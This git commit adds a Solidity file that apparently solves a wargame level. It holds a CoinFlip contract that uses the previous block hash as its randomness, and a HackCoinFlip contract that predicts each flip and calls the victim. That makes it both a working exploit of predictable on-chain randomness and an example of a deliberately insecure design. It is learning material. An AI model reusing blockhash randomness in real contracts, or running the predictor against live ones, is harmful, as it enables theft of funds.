46a89f289692470650fc7f1acb9714b7c277bff0
EzeChinonso <48421032+EzeChinonso@users.noreply.github.com>
2020-06-18 19:06:56 +0100

    Create coinflip.sol

---
+++ coinflip.sol
@@ -0,0 +1,53 @@
+pragma solidity ^0.6.0;
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol";
+
+contract CoinFlip {
+
+  using SafeMath for uint256;
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+
+//Random events on the blockchain are deterministic - those events could be mimicked
+//To hack coinflip we create another similiar contract with the intention of recreating the random event
+
+contract HackCoinFlip{
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip victim;
+    
+    function rightGuess(address _victim) public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        victim = CoinFlip(_victim);
+        victim.flip(side);
+    } 
+}
